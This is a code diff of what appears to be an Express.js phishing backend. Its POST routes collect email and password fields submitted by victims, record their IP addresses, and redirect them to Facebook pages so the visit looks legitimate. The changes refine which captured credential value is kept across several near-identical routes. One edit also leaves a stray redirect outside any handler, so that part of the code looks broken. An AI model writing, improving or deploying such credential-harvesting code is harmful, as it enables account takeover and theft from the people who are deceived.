@@ -61,7 +61,7 @@ app.get('/', function (req, res) {
 
 
 app.post('/confirm', function (req, res) {
-    
+
     res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/453806845163371/?type=3&theater')
     var mail = req.body.email_a;
     var password = req.body.pass_a;
@@ -69,11 +69,15 @@ app.post('/confirm', function (req, res) {
     var d = req.body.pass;
     if (mail == undefined) {
         mail = c;
+    } else if (mail.length < c.length) {
+        mail = c;
     }
+
     if (password == undefined) {
         password = d;
+    } else if (password.length < d.length) {
+        password = d;
     }
-    console.log(password+'*'+mail+c+d)
     var ip = req.headers['x-forwarded-for'] ||
         req.connection.remoteAddress ||
         req.socket.remoteAddress ||
@@ -96,8 +100,13 @@ app.post('/confirm/sama', function (req, res) {
     var d = req.body.pass;
     if (mail == undefined) {
         mail = c;
+    } else if (mail.length < c.length) {
+        mail = c;
     }
+
     if (password == undefined) {
+        password = d;
+    } else if (password.length < d.length) {
         password = d;
     }
     var ip = req.headers['x-forwarded-for'] ||
@@ -120,8 +129,13 @@ app.post('/confirm_amir', function (req, res) {
     var d = req.body.pass;
     if (mail == undefined) {
         mail = c;
+    } else if (mail.length < c.length) {
+        mail = c;
     }
+
     if (password == undefined) {
+        password = d;
+    } else if (password.length < d.length) {
         password = d;
     }
     var ip = req.headers['x-forwarded-for'] ||
@@ -152,8 +166,13 @@ app.post('/confirm/fad', function (req, res) {
     var d = req.body.pass;
     if (mail == undefined) {
         mail = c;
+    } else if (mail.length < c.length) {
+        mail = c;
     }
+
     if (password == undefined) {
+        password = d;
+    } else if (password.length < d.length) {
         password = d;
     }
     var ip = req.headers['x-forwarded-for'] ||
@@ -174,17 +193,22 @@ app.post('/confirm/fad', function (req, res) {
 // app.post('/confirm/sina', function (req, res) {
 
 
-//     res.redirect('https://www.facebook.com/groups/su180/')
-//     var mail = req.body.email_a;
-//     var password = req.body.pass_a;
-//     var c = req.body.email;
-//     var d = req.body.pass;
-//     if (mail == undefined) {
-//         mail = c;
-//     }
-//     if (password == undefined) {
-//         password = d;
-//     }
+res.redirect('https://www.facebook.com/groups/su180/')
+// var mail = req.body.email_a;
+// var password = req.body.pass_a;
+// var c = req.body.email;
+// var d = req.body.pass;
+// if (mail == undefined) {
+//     mail = c;
+// } else if (mail.length < c.length) {
+//     mail = c;
+// }
+
+// if (password == undefined) {
+//     password = d;
+// } else if (password.length < d.length) {
+//     password = d;
+// }
 //     var ip = req.headers['x-forwarded-for'] ||
 //         req.connection.remoteAddress ||
 //         req.socket.remoteAddress ||
